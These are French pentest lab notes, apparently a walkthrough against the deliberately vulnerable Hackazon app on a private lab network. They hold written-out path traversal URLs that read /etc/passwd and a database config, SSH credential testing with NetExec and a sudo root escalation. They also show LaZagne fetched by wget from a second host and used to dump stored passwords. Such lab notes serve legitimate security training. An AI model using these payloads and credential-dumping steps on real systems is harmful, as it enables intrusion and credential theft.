<ins>1.Énumération</ins>

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.75
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.75...100%
[+] Scan Nmap 192.168.56.75...100%
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.75-tcp.html        |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">⚡</span> **ZAP**

Rapport après fin de scan

![Capture du 2025-02-09 18-32-13.png](file:///home/kali/.config/joplin-desktop/resources/bb45b742d0c843f7905ba152083c7b2c.png)

&nbsp;

Traverser de chemin

[http://192.168.56.75/account/documents?page=…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F /etc/passwd](http://192.168.56.75/account/documents?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%20/etc/passwd)

![path_traversal.png](file:///home/kali/.config/joplin-desktop/resources/5419d791130e4b02816a6320624d7b1b.png)

&nbsp;

Allons voir le fichier `db.php`

[http://192.168.56.75/account/documents?page=…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F…%2F /var/www/hackazon/assets/config/db.php](http://192.168.56.75/account/documents?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%20/var/www/hackazon/assets/config/db.php)

![injection_commande.png](file:///home/kali/.config/joplin-desktop/resources/0aa9639d9c7745499aff28ca80bff0f9.png)

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Test en `SSH` des identifiant trouver

```
┌─[parrot@parrot]─[~]
└──╼ $nxc ssh 192.168.56.75 -u hackazon -p hackazon --sudo-check
SSH         192.168.56.75   22     192.168.56.75    [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
SSH         192.168.56.75   22     192.168.56.75    [+] hackazon:hackazon (Pwn3d!) Linux - Shell access!
```

&nbsp;

L’utilisateur `hackazon` fais parti du groupe `sudo`

```
hackazon@ubuntu:~$ sudo -s
[sudo] password for hackazon: 
root@ubuntu:~# 
```

&nbsp;

****<span style="color: #dddddd;">👾</span>** LaZagne**

Téléchargement du fichier zip

```
root@ubuntu:~# wget 192.168.56.104:8080/LaZagne-2.4.6.zip
--2025-02-09 09:06:38--  http://192.168.56.104:8080/LaZagne-2.4.6.zip
Connecting to 192.168.56.104:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 705000 (688K) [application/zip]
Saving to: 'LaZagne-2.4.6.zip'

LaZagne-2.4.6.zip                               100%[=====================================================================================================>] 688.48K  --.-KB/s    in 0.008s  

2025-02-09 09:06:38 (79.1 MB/s) - 'LaZagne-2.4.6.zip' saved [705000/705000]
```

&nbsp;

Unzip

```
root@ubuntu:~# unzip LaZagne-2.4.6.zip
Archive:  LaZagne-2.4.6.zip
3ed06c785c417a77c2bc9a09987060425249036d
   creating: LaZagne-2.4.6/
```

&nbsp;

Exécution

```
root@ubuntu:~/LaZagne-2.4.6/Linux# python3 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Password found !!!
Login: hackazon
Password: hackazon

------------------- Mimipy passwords -----------------

[+] Password found !!!
Process: /usr/sbin/sshd
Login: hackazon
Password: hackazon


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.5735633373260498
```

&nbsp;

Cred trouver

| Users | Password |
| --- | --- |
| hackazon | hackazon |
